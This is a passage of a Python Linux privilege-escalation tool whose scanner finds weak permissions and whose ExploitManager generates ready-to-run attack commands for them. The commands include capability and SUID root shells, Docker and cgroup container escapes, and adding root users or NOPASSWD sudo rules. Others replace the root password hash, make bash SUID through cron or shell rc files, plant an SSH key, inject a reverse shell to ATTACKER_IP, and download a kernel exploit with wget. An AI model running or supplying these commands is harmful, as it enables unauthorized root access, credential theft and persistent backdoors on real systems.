        # Check systemd timers
        try:
            timer_output = subprocess.check_output(['systemctl', 'list-timers', '--all']).decode('utf-8')
            timer_lines = timer_output.split('\n')
            
            for line in timer_lines[1:]:  # Skip header line
                if not line.strip():
                    continue
                
                timer_parts = line.split()
                if len(timer_parts) >= 5:
                    timer_name = timer_parts[0]
                    
                    # Get the timer unit file
                    try:
                        unit_file = subprocess.check_output(['systemctl', 'show', '-p', 'FragmentPath', timer_name]).decode('utf-8')
                        unit_file_path = unit_file.split('=')[1].strip()
                        
                        if os.access(unit_file_path, os.W_OK):
                            file_stat = os.stat(unit_file_path)
                            
                            # Get ownership information
                            try:
                                owner = pwd.getpwuid(file_stat.st_uid).pw_name
                            except:
                                owner = str(file_stat.st_uid)
                            
                            try:
                                group = grp.getgrgid(file_stat.st_gid).gr_name
                            except:
                                group = str(file_stat.st_gid)
                            
                            vuln = {
                                'type': 'writable_systemd_timer',
                                'timer_name': timer_name,
                                'path': unit_file_path,
                                'owner': owner,
                                'group': group,
                                'permissions': oct(file_stat.st_mode)[-4:]
                            }
                            
                            self.logger.log(LogLevel.SUCCESS, f"Found writable systemd timer: {timer_name} ({unit_file_path})")
                            self.vulnerabilities.append(vuln)
                    
                    except Exception as e:
                        self.logger.log(LogLevel.DEBUG, f"Error checking systemd timer {timer_name}: {e}")
        
        except Exception as e:
            self.logger.log(LogLevel.DEBUG, f"Error listing systemd timers: {e}")
    
    def scan_sudo_permissions(self):
        """Check for sudo permissions of the current user with verification"""
        self.logger.log(LogLevel.INFO, "Checking sudo permissions...")
        
        try:
            # Check if sudo is available
            subprocess.check_output(['which', 'sudo'])
            
            # Test if we can use sudo without a password 
            try:
                sudo_test = subprocess.run(['sudo', '-n', 'true'], stderr=subprocess.PIPE, timeout=2)
                can_sudo = sudo_test.returncode == 0
                
                if can_sudo:
                    # Get current user's sudo permissions
                    sudo_output = subprocess.check_output(['sudo', '-l'], stderr=subprocess.STDOUT, timeout=2).decode('utf-8')
                    
                    # Check for dangerous sudo permissions
                    dangerous_commands = [
                        'ALL', 'NOPASSWD', 'ALL : ALL', '(ALL)', '(ALL : ALL)',
                        'vim', 'vi', 'nano', 'less', 'more', 'man', 'find', 'cp', 'mv',
                        'perl', 'python', 'ruby', 'php', 'bash', 'sh', 'ksh', 'zsh',
                        'nmap', 'netcat', 'nc', 'awk', 'sed', 'tee', 'cat'
                    ]
                    
                    for cmd in dangerous_commands:
                        if cmd in sudo_output:
                            vuln = {
                                'type': 'dangerous_sudo_permission',
                                'command': cmd,
                                'sudo_output': sudo_output,
                                'is_exploitable': True
                            }
                            
                            self.logger.log(LogLevel.SUCCESS, f"Found dangerous sudo permission: {cmd}")
                            self.logger.log(LogLevel.SUCCESS, f"  Verified as usable by current user without password")
                            self.vulnerabilities.append(vuln)
                else:
                    self.logger.log(LogLevel.INFO, "User cannot use sudo without a password")
                    
            except subprocess.CalledProcessError:
                # User might not have sudo rights
                self.logger.log(LogLevel.DEBUG, "User doesn't have sudo rights or requires a password")
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking sudo permissions: {e}")
                
        except subprocess.CalledProcessError:
            self.logger.log(LogLevel.DEBUG, "Sudo is not available on this system")
        except Exception as e:
            self.logger.log(LogLevel.DEBUG, f"Error checking sudo permissions: {e}")
    
    def scan_exposed_services(self):
        """Scan for exposed services on localhost that might be vulnerable"""
        self.logger.log(LogLevel.INFO, "Scanning for exposed services on localhost...")
        
        # Ports to check
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 
                        993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 27017]
        
        try:
            import socket
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex(('127.0.0.1', port))
                    if result == 0:
                        service = self.get_service_name(port)
                        
                        vuln = {
                            'type': 'exposed_service',
                            'port': port,
                            'service': service,
                            'address': '127.0.0.1'
                        }
                        
                        self.logger.log(LogLevel.INFO, f"Found exposed service: {service} on port {port}")
                        self.vulnerabilities.append(vuln)
                    
                    sock.close()
                except Exception as e:
                    self.logger.log(LogLevel.DEBUG, f"Error checking port {port}: {e}")
        
        except Exception as e:
            self.logger.log(LogLevel.ERROR, f"Error scanning for exposed services: {e}")
    
    def get_service_name(self, port):
        """Get service name from port number"""
        service_map = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            111: 'RPC',
            135: 'RPC',
            139: 'NetBIOS',
            143: 'IMAP',
            389: 'LDAP',
            443: 'HTTPS',
            445: 'SMB',
            993: 'IMAPS',
            995: 'POP3S',
            1433: 'MSSQL',
            1521: 'Oracle',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            5900: 'VNC',
            6379: 'Redis',
            8080: 'HTTP-Proxy',
            27017: 'MongoDB'
        }
        
        return service_map.get(port, f'Unknown-{port}')
    
    def scan_path_hijacking(self):
        """Check for PATH hijacking opportunities with verification"""
        self.logger.log(LogLevel.INFO, "Checking for PATH hijacking opportunities...")
        
        # Get the PATH environment variable
        path = os.environ.get('PATH', '')
        path_dirs = path.split(':')
        
        # Check for writable directories in PATH
        writable_dirs = []
        for directory in path_dirs:
            try:
                if os.path.exists(directory) and os.access(directory, os.W_OK):
                    # Verify we can actually create a file in this directory
                    try:
                        test_file = os.path.join(directory, f'.test_write_{int(time.time())}')
                        with open(test_file, 'w') as f:
                            f.write('test')
                        os.remove(test_file)  # Clean up after ourselves
                        
                        dir_stat = os.stat(directory)
                        
                        # Get ownership information
                        try:
                            owner = pwd.getpwuid(dir_stat.st_uid).pw_name
                        except:
                            owner = str(dir_stat.st_uid)
                        
                        try:
                            group = grp.getgrgid(dir_stat.st_gid).gr_name
                        except:
                            group = str(dir_stat.st_gid)
                        
                        vuln = {
                            'type': 'writable_path_directory',
                            'path': directory,
                            'owner': owner,
                            'group': group,
                            'permissions': oct(dir_stat.st_mode)[-4:],
                            'is_exploitable': True
                        }
                        
                        self.logger.log(LogLevel.SUCCESS, f"Found writable directory in PATH: {directory}")
                        self.logger.log(LogLevel.SUCCESS, f"  Verified as writable by current user")
                        self.vulnerabilities.append(vuln)
                        writable_dirs.append(directory)
                    except (IOError, PermissionError):
                        # The OS reported it's writable but we couldn't actually write to it
                        self.logger.log(LogLevel.DEBUG, f"Directory {directory} appears writable but write attempt failed")
                
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking PATH directory {directory}: {e}")
                    
        # Check for common commands with relative paths
        if writable_dirs:
            try:
                history_files = []
                
                # Check bash history files
                for root, dirs, files in os.walk('/home/', topdown=True):
                    for file in files:
                        if file == '.bash_history':
                            history_files.append(os.path.join(root, file))
                
                # Also check root's history
                if os.path.exists('/root/.bash_history'):
                    history_files.append('/root/.bash_history')
                
                # Common commands to check for
                common_commands = ['ls', 'cat', 'cp', 'mv', 'chmod', 'chown', 'find', 'grep']
                vulnerable_commands = set()
                
                for history_file in history_files:
                    try:
                        if os.access(history_file, os.R_OK):
                            with open(history_file, 'r', errors='ignore') as f:
                                for line in f:
                                    for cmd in common_commands:
                                        if line.strip() == cmd or line.strip().startswith(f"{cmd} "):
                                            vulnerable_commands.add(cmd)
                    except Exception as e:
                        self.logger.log(LogLevel.DEBUG, f"Error reading history file {history_file}: {e}")
                
                # If no commands found in history, add some defaults
                if not vulnerable_commands:
                    vulnerable_commands = {'ls', 'cat', 'find'}
                
                # Report commands that might be vulnerable to PATH hijacking
                for cmd in vulnerable_commands:
                    # Check if the command is already present in any directory in PATH
                    # that comes before our writable directory
                    cmd_exists = False
                    cmd_path = None
                    
                    for directory in path_dirs:
                        cmd_path = os.path.join(directory, cmd)
                        if os.path.exists(cmd_path) and os.path.isfile(cmd_path):
                            if directory in writable_dirs:
                                # We can just overwrite the existing version in our writable dir
                                cmd_exists = False
                                break
                            else:
                                # Check if this instance is earlier in PATH than our writable directory
                                if path_dirs.index(directory) < min([path_dirs.index(d) for d in writable_dirs]):
                                    cmd_exists = True
                                    break
                    
                    if not cmd_exists:
                        vuln = {
                            'type': 'path_hijacking',
                            'command': cmd,
                            'writable_directory': writable_dirs[0],
                            'is_exploitable': True
                        }
                        
                        self.logger.log(LogLevel.SUCCESS, f"Potential PATH hijacking for command: {cmd}")
                        self.logger.log(LogLevel.INFO, f"  Writable directory in PATH: {writable_dirs[0]}")
                        self.vulnerabilities.append(vuln)
                    
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking for PATH hijacking: {e}")

class ExploitManager:
    def __init__(self, logger, vulnerabilities, username=None, verification_mode='safe', verify_timeout=10):
        self.logger = logger
        self.vulnerabilities = vulnerabilities
        self.username = username or os.getlogin()
        self.exploits = []
        self.verification_mode = verification_mode
        self.verify_timeout = verify_timeout
        
        # Initialize the verifier if needed
        if verification_mode != 'none':
            self.verifier = VulnerabilityVerifier(
                logger=logger,
                verification_mode=verification_mode,
                timeout=verify_timeout
            )
    
    def generate_exploits(self):
        """Generate exploits for the discovered and verified vulnerabilities"""
        self.logger.log(LogLevel.INFO, "Generating exploits for discovered vulnerabilities...")

        # Filter out vulnerabilities that are not exploitable
        verified_vulnerabilities = []
        for vuln in self.vulnerabilities:
            if vuln.get('is_exploitable', False):
                verified_vulnerabilities.append(vuln)
            # For backward compatibility, if is_exploitable is not set, assume it might be exploitable
            elif 'is_exploitable' not in vuln:
                verified_vulnerabilities.append(vuln)

        self.logger.log(LogLevel.INFO, f"Found {len(verified_vulnerabilities)} verified vulnerabilities out of {len(self.vulnerabilities)} total")

        # Group vulnerabilities by type
        vuln_types = {}
        for vuln in verified_vulnerabilities:
            vuln_type = vuln.get('type', 'unknown')
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(vuln)

        # Generate exploits for each vulnerability type
        for vuln_type, vulns in vuln_types.items():
            method_name = f"exploit_{vuln_type}"
            if hasattr(self, method_name) and callable(getattr(self, method_name)):
                try:
                    method = getattr(self, method_name)
                    potential_exploits = method(vulns)
                    
                    # If verification is enabled and in full mode, test each exploit
                    if self.verification_mode == 'full' and potential_exploits:
                        verified_exploits = []
                        
                        for exploit in potential_exploits:
                            vulnerability = exploit.get('vulnerability')
                            
                            # Verify the exploit actually works
                            is_exploitable, reason = self.verifier.verify_vulnerability(vulnerability, exploit)
                            
                            # Update the vulnerability with verification results
                            vulnerability['is_exploitable'] = is_exploitable
                            vulnerability['verification_reason'] = reason
                            
                            # Only add verified exploits
                            if is_exploitable:
                                verified_exploits.append(exploit)
                                self.logger.log(LogLevel.SUCCESS, f"Verified working exploit: {reason}")
                            else:
                                self.logger.log(LogLevel.WARNING, f"Exploit verification failed: {reason}")
                        
                        # Add the verified exploits
                        self.exploits.extend(verified_exploits)
                    else:
                        # If verification is disabled or in safe mode, add all exploits
                        self.exploits.extend(potential_exploits)
                    
                except Exception as e:
                    self.logger.log(LogLevel.ERROR, f"Error generating exploits for {vuln_type}: {e}")

        return self.exploits
    
    def exploit_history_file_exposure(self, vulns):
        """Generate exploits for history file exposures"""
        exploits = []
        
        for vuln in vulns:
            file_path = vuln.get('path')
            matches = vuln.get('matches', [])
            
            exploit = {
                'type': 'history_file_exposure',
                'vulnerability': vuln,
                'command': f"cat {file_path} | grep -E '(password|ssh|key|token)'",
                'description': f"Extract sensitive information from history file {file_path}"
            }
            
            self.logger.log(LogLevel.SUCCESS, f"Generated exploit for history file exposure")
            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
            
            exploits.append(exploit)
        
        return exploits

    def exploit_ssh_key_weak_permissions(self, vulns):
        """Generate exploits for SSH keys with weak permissions"""
        exploits = []
        
        for vuln in vulns:
            file_path = vuln.get('path')
            
            if 'id_rsa' in file_path or 'id_dsa' in file_path or 'id_ecdsa' in file_path or 'id_ed25519' in file_path:
                exploit = {
                    'type': 'ssh_key_weak_permissions',
                    'vulnerability': vuln,
                    'command': f"cat {file_path}",
                    'description': f"Extract private key from {file_path} for unauthorized SSH access"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for weak SSH key permissions")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
        
        return exploits

    def exploit_readable_ssh_private_key(self, vulns):
        """Generate exploits for readable SSH private keys"""
        exploits = []
        
        for vuln in vulns:
            file_path = vuln.get('path')
            
            exploit = {
                'type': 'readable_ssh_private_key',
                'vulnerability': vuln,
                'command': f"cat {file_path}",
                'description': f"Extract private key from {file_path} for SSH access"
            }
            
            self.logger.log(LogLevel.SUCCESS, f"Generated exploit for readable SSH private key")
            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
            
            exploits.append(exploit)
        
        return exploits

    def exploit_sensitive_info_exposure(self, vulns):
        """Generate exploits for sensitive information exposure"""
        exploits = []
        
        for vuln in vulns:
            file_path = vuln.get('path')
            matches = vuln.get('sensitive_matches', [])
            
            exploit = {
                'type': 'sensitive_info_exposure',
                'vulnerability': vuln,
                'command': f"cat {file_path}",
                'description': f"Extract sensitive information from {file_path}"
            }
            
            self.logger.log(LogLevel.SUCCESS, f"Generated exploit for sensitive information exposure")
            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
            
            exploits.append(exploit)
        
        return exploits

    def exploit_dangerous_capability(self, vulns):
        """Generate exploits for binaries with dangerous capabilities"""
        exploits = []
        
        # Map of capabilities to exploit methods
        capability_exploits = {
            'cap_setuid': 'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";\'',
            'cap_setgid': 'perl -e \'use POSIX qw(setgid); POSIX::setgid(0); exec "/bin/sh";\'',
            'cap_dac_override': 'cp /etc/shadow /tmp/shadow_copy || cat /etc/shadow',
            'cap_dac_read_search': 'cat /etc/shadow',
            'cap_sys_admin': 'mount -t tmpfs tmpfs /mnt && cp /bin/bash /mnt/bash && chmod +s /mnt/bash && /mnt/bash -p',
            'cap_sys_ptrace': 'echo "void main() { setuid(0); system(\"/bin/bash\"); }" > /tmp/ptrace.c && gcc /tmp/ptrace.c -o /tmp/ptrace && /tmp/ptrace',
            'cap_chown': 'chown root:root /bin/bash && chmod +s /bin/bash',
            'cap_fowner': 'chmod +s /bin/bash',
            'cap_sys_module': 'echo "void init(void) { system(\"/bin/bash\"); }" > /tmp/mod.c && gcc -fPIC -shared -o /tmp/mod.so /tmp/mod.c && insmod /tmp/mod.so'
        }
        
        for vuln in vulns:
            binary_path = vuln.get('path')
            capabilities = vuln.get('capabilities', '')
            
            # Find the first dangerous capability that's present
            for cap, exploit_cmd in capability_exploits.items():
                if cap in capabilities:
                    exploit = {
                        'type': 'dangerous_capability',
                        'vulnerability': vuln,
                        'command': f"{binary_path} {exploit_cmd}",
                        'description': f"Exploit {cap} capability on {binary_path} to gain elevated privileges"
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"Generated exploit for dangerous capability {cap}")
                    self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                    
                    exploits.append(exploit)
                    break
        
        return exploits

    def exploit_accessible_docker_socket(self, vulns):
        """Generate exploits for accessible Docker socket"""
        exploits = []
        
        for vuln in vulns:
            exploit = {
                'type': 'accessible_docker_socket',
                'vulnerability': vuln,
                'command': "docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host bash",
                'description': "Use Docker socket to mount host filesystem and get root access"
            }
            
            self.logger.log(LogLevel.SUCCESS, "Generated exploit for accessible Docker socket")
            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
            
            exploits.append(exploit)
        
        return exploits

    def exploit_privileged_container(self, vulns):
        """Generate exploits for privileged container"""
        exploits = []
        
        for vuln in vulns:
            exploit = {
                'type': 'privileged_container',
                'vulnerability': vuln,
                'command': "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` && echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && echo '#!/bin/sh\\nchmod +s /bin/bash' > /cmd && chmod a+x /cmd && sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\" && sleep 1 && /bin/bash -p",
                'description': "Escape from privileged container to get root on the host system"
            }
            
            self.logger.log(LogLevel.SUCCESS, "Generated exploit for privileged container")
            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
            
            exploits.append(exploit)
        
        return exploits
    
    def exploit_suid_binary(self, vulns):
        """Generate exploits for SUID binary vulnerabilities using GTFOBins techniques"""
        exploits = []
        
        # The exploitable_suid_binaries dictionary is already defined in scan_suid_binaries
        # and the exploit_method should be populated for each vulnerability
        
        for vuln in vulns:
            binary_path = vuln.get('path')
            binary_name = os.path.basename(binary_path)
            exploit_method = vuln.get('exploit_method', '')
            
            if exploit_method:
                # Descriptive exploit messages based on binary type
                if binary_name in ['python', 'python2', 'python3', 'perl', 'ruby', 'php']:
                    description = f"Exploit SUID {binary_name} to execute commands with elevated privileges"
                elif binary_name in ['tar', 'zip', 'rsync']:
                    description = f"Exploit SUID {binary_name} to execute commands during archive operations"
                elif binary_name in ['vim', 'vi', 'nano', 'emacs', 'view', 'rview', 'rvim', 'vimdiff', 'pico']:
                    description = f"Break out to privileged shell from SUID {binary_name} editor"
                elif binary_name in ['mysql', 'sqlite3']:
                    description = f"Execute commands with privileges of SUID {binary_name} database"
                elif binary_name in ['docker']:
                    description = f"Escape container and gain root access with SUID {binary_name}"
                else:
                    description = f"Exploit SUID binary {binary_name} to get a shell with elevated privileges"
                
                exploit = {
                    'type': 'suid_binary',
                    'vulnerability': vuln,
                    'command': f"{binary_path} {exploit_method}",
                    'description': description
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for SUID binary {binary_name}")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
        
        return exploits
    
    def exploit_sgid_binary(self, vulns):
        """Generate exploits for SGID binary vulnerabilities"""
        exploits = []
        
        for vuln in vulns:
            binary_path = vuln.get('path')
            binary_name = os.path.basename(binary_path)
            group = vuln.get('group', 'unknown')
            
            # Most exploit methods for SUID also work for SGID
            exploit_method = vuln.get('exploit_method', '')
            
            if exploit_method:
                # Create specialized descriptions for SGID binaries
                if binary_name in ['python', 'python2', 'python3', 'perl', 'ruby', 'php']:
                    description = f"Exploit SGID {binary_name} to execute commands with {group} group privileges"
                elif binary_name in ['tar', 'zip', 'rsync']:
                    description = f"Exploit SGID {binary_name} to access files with {group} group permissions"
                elif binary_name in ['vim', 'vi', 'nano', 'emacs', 'view', 'rview', 'rvim', 'vimdiff', 'pico']:
                    description = f"Use SGID {binary_name} editor to access files restricted to {group} group"
                elif binary_name in ['find', 'grep', 'cat', 'head', 'tail']:
                    description = f"Use SGID {binary_name} to read files accessible to {group} group"
                elif binary_name in ['mysql', 'sqlite3']:
                    description = f"Execute commands with {group} group privileges via SGID {binary_name}"
                else:
                    description = f"Exploit SGID binary {binary_name} to gain {group} group privileges"
                
                exploit = {
                    'type': 'sgid_binary',
                    'vulnerability': vuln,
                    'command': f"{binary_path} {exploit_method}",
                    'description': description
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for SGID binary {binary_name}")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                self.logger.log(LogLevel.INFO, f"  Group access: {group}")
                
                exploits.append(exploit)
            
        return exploits
    
    def exploit_writable_file(self, vulns):
        """Generate exploits for writable file vulnerabilities"""
        exploits = []
        
        for vuln in vulns:
            file_path = vuln.get('path')
            is_critical = vuln.get('is_critical', False)
            
            if is_critical:
                # For critical files like /etc/passwd, we can add a new user
                if '/etc/passwd' in file_path:
                    # Generate a password hash for 'password123'
                    password_hash = 'x'  # In /etc/passwd, the password is stored in /etc/shadow
                    
                    exploit = {
                        'type': 'writable_passwd',
                        'vulnerability': vuln,
                        'command': f"echo '{self.username}:{password_hash}:0:0:root:/root:/bin/bash' >> {file_path}",
                        'description': f"Add a new root user to {file_path}"
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"Generated exploit for writable passwd file")
                    self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                    
                    exploits.append(exploit)
                
                # For sudoers file, we can add a new sudo entry
                elif '/etc/sudoers' in file_path:
                    exploit = {
                        'type': 'writable_sudoers',
                        'vulnerability': vuln,
                        'command': f"echo '{self.username} ALL=(ALL) NOPASSWD:ALL' >> {file_path}",
                        'description': f"Add a sudo rule to {file_path} allowing the user to execute any command without a password"
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"Generated exploit for writable sudoers file")
                    self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                    
                    exploits.append(exploit)
                
                # For shadow file, we can modify the root password
                elif '/etc/shadow' in file_path:
                    # Generate a password hash for 'password123'
                    import crypt
                    password_hash = crypt.crypt('password123', crypt.mksalt(crypt.METHOD_SHA512))
                    
                    exploit = {
                        'type': 'writable_shadow',
                        'vulnerability': vuln,
                        'command': f"sed -i 's/^root:.*/root:{password_hash}:18600:0:99999:7:::/' {file_path}",
                        'description': f"Change the root password in {file_path}"
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"Generated exploit for writable shadow file")
                    self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                    
                    exploits.append(exploit)
            
            # For other writable files, if they're scripts or config files, we can inject code
            elif any(file_path.endswith(ext) for ext in ['.sh', '.py', '.pl', '.rb', '.conf']):
                exploit = {
                    'type': 'writable_file_inject',
                    'vulnerability': vuln,
                    'command': f"echo 'os.system(\"/bin/bash -c \\\"bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1\\\"\")'",
                    'description': f"Inject a reverse shell into {file_path}"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for writable file {file_path}")
                exploits.append(exploit)
        
        return exploits
    
    def exploit_world_writable_directory(self, vulns):
        """Generate exploits for world-writable directory vulnerabilities"""
        exploits = []
        
        for vuln in vulns:
            dir_path = vuln.get('path')
            is_critical = vuln.get('is_critical', False)
            
            if is_critical:
                # If it's a critical directory, we can create files that might get executed
                if '/etc/cron.d' in dir_path:
                    exploit = {
                        'type': 'writable_cron_directory',
                        'vulnerability': vuln,
                        'command': f"echo '* * * * * root chmod +s /bin/bash' > {os.path.join(dir_path, 'privesc')}",
                        'description': f"Create a cron job in {dir_path} to make /bin/bash SUID"
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"Generated exploit for writable cron directory")
                    self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                    
                    exploits.append(exploit)
                
                elif '/etc/init.d' in dir_path or '/etc/systemd' in dir_path:
                    exploit = {
                        'type': 'writable_init_directory',
                        'vulnerability': vuln,
                        'command': f"echo '#!/bin/bash\\nchmod +s /bin/bash' > {os.path.join(dir_path, 'privesc')}",
                        'description': f"Create a startup script in {dir_path} to make /bin/bash SUID"
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"Generated exploit for writable init directory")
                    self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                    
                    exploits.append(exploit)
            
            # We can also check if it's a directory in PATH where we can create a binary with the same name as a commonly used command
            if 'path_hijacking' in [v.get('type') for v in self.vulnerabilities]:
                path_cmds = [v.get('command') for v in self.vulnerabilities if v.get('type') == 'path_hijacking']
                
                for cmd in path_cmds:
                    if os.path.exists(f"{dir_path}/{cmd}"):
                        continue  # Skip if the file already exists
                    
                    exploit = {
                        'type': 'path_hijacking',
                        'vulnerability': vuln,
                        'command': f"echo '#!/bin/bash\\nchmod +s /bin/bash' > {os.path.join(dir_path, cmd)} && chmod +x {os.path.join(dir_path, cmd)}",
                        'description': f"Create a malicious {cmd} binary in {dir_path} to make /bin/bash SUID"
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"Generated exploit for PATH hijacking of {cmd}")
                    self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                    
                    exploits.append(exploit)
        
        return exploits
    
    def exploit_weak_file_permissions(self, vulns):
        """Generate exploits for weak file permissions vulnerabilities"""
        exploits = []
        
        for vuln in vulns:
            file_path = vuln.get('path')
            
            if '/etc/passwd' in file_path:
                # For writable /etc/passwd file, create a new root user
                password_hash = 'x'  # The 'x' means the password is in /etc/shadow
                
                exploit = {
                    'type': 'weak_passwd_permissions',
                    'vulnerability': vuln,
                    'command': f"echo 'privesc:{password_hash}:0:0:root:/root:/bin/bash' >> {file_path}",
                    'description': f"Add a new root user to {file_path} due to weak permissions"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for weak permissions on passwd file")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
                
            elif '/etc/shadow' in file_path:
                # For readable /etc/shadow, extract password hashes
                exploit = {
                    'type': 'weak_shadow_permissions',
                    'vulnerability': vuln,
                    'command': f"cat {file_path}",
                    'description': f"Extract password hashes from {file_path} due to weak permissions"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for weak permissions on shadow file")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
                
            elif '/etc/sudoers' in file_path:
                # For writable sudoers file, add NOPASSWD entry
                exploit = {
                    'type': 'weak_sudoers_permissions',
                    'vulnerability': vuln,
                    'command': f"echo '{self.username} ALL=(ALL) NOPASSWD:ALL' >> {file_path}",
                    'description': f"Add sudo privileges via {file_path} due to weak permissions"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for weak permissions on sudoers file")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
                
            elif '/etc/ssh' in file_path:
                # For writable SSH config files
                if 'sshd_config' in file_path:
                    exploit = {
                        'type': 'weak_sshd_config_permissions',
                        'vulnerability': vuln,
                        'command': f"echo 'PermitRootLogin yes\\nPasswordAuthentication yes\\nAllowUsers root' >> {file_path}",
                        'description': f"Modify SSH configuration in {file_path} to allow root login"
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"Generated exploit for weak permissions on SSH config")
                    self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                    
                    exploits.append(exploit)
                elif 'authorized_keys' in file_path:
                    exploit = {
                        'type': 'weak_authorized_keys_permissions',
                        'vulnerability': vuln,
                        'command': "echo 'ssh-rsa REPLACE_WITH_YOUR_PUBLIC_KEY' >> " + file_path,
                        'description': f"Add unauthorized SSH key to {file_path} due to weak permissions"
                    }
                    
                    self.logger.log(LogLevel.SUCCESS, f"Generated exploit for weak permissions on authorized_keys")
                    self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                    
                    exploits.append(exploit)
            
            elif '/etc/cron' in file_path or '/var/spool/cron' in file_path:
                # For writable cron files
                exploit = {
                    'type': 'weak_cron_permissions',
                    'vulnerability': vuln,
                    'command': f"echo '* * * * * root chmod +s /bin/bash' >> {file_path}",
                    'description': f"Add malicious cron job to {file_path} to make /bin/bash SUID"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for weak permissions on cron file")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
            
            elif '/etc/profile' in file_path or '.bashrc' in file_path or '.bash_profile' in file_path:
                # For writable login/shell config files
                exploit = {
                    'type': 'weak_shell_config_permissions',
                    'vulnerability': vuln,
                    'command': f"echo 'chmod +s /bin/bash 2>/dev/null' >> {file_path}",
                    'description': f"Add backdoor command to {file_path} that gets executed on login"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for weak permissions on shell config")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
        
        return exploits
    
    def exploit_docker_group_member(self, vulns):
        """Generate exploits for Docker group membership vulnerabilities"""
        exploits = []
        
        for vuln in vulns:
            exploit = {
                'type': 'docker_group_exploit',
                'vulnerability': vuln,
                'command': "docker run -v /:/host -it ubuntu chroot /host /bin/bash",
                'description': "Use Docker group membership to mount the host filesystem and get root access"
            }
            
            self.logger.log(LogLevel.SUCCESS, "Generated exploit for Docker group membership")
            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
            
            exploits.append(exploit)
        
        return exploits
    
    def exploit_plaintext_credentials(self, vulns):
        """Generate exploits for plaintext credentials vulnerabilities"""
        exploits = []
        
        for vuln in vulns:
            file_path = vuln.get('path')
            matches = vuln.get('matches', [])
            
            exploit = {
                'type': 'plaintext_credentials',
                'vulnerability': vuln,
                'command': f"cat {file_path}",
                'description': f"Extract plaintext credentials from {file_path}"
            }
            
            self.logger.log(LogLevel.SUCCESS, f"Found plaintext credentials in {file_path}")
            
            # Add examples of found credentials
            if matches:
                self.logger.log(LogLevel.INFO, "  Examples of credentials:")
                for match in matches:
                    self.logger.log(LogLevel.INFO, f"    {match}")
            
            exploits.append(exploit)
        
        return exploits
    
    def exploit_kernel_exploit(self, vulns):
        """Generate exploits for kernel vulnerabilities"""
        exploits = []
        
        # Map of CVEs to exploit scripts or commands
        kernel_exploit_scripts = {
            'CVE-2009-2698': 'wget https://www.exploit-db.com/download/9542 -O sock_sendpage.c && gcc sock_sendpage.c -o sock_sendpage && ./sock_sendpage',
